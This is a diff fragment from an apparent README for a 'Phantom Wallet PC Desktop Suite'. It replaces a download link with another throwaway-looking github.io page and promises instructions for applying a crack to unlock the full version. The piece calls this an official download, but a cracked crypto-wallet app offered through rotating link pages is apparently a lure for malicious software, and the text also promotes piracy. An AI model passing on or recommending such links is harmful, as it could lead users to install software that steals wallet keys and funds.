@@ -57,7 +57,7 @@ A: Updates are automatically checked when the application starts. If an update i
 
 To download the Phantom Wallet PC Desktop Suite, use the following link:
 
-[Get it here](https://yellowtaxisave.github.io/download-page/)
+[Get it here](https://capitals-707-bringing.github.io/download-page/)
 
 This will take you to the official download page where you can find the latest version and additional resources, including instructions for applying the crack for the full version.
 
